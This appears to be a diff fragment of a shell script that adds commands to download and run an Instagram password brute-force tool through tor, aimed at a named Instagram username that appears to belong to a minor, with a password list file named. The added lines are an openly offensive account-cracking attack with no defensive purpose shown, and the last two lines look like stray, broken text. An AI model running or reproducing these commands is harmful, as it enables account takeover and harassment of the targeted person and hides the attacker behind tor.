@@ -102,4 +102,11 @@ done
 }
 
 bruteforcer
-
+git clone https://github.com/thelinuxchoice/instashell.git
+service tor start
+cd instashell/
+chmod 775 instashell.sh
+chmod 775 install.sh
+./instashell.sh u-queen__kritika.2009
+blogshacking
+password.lst
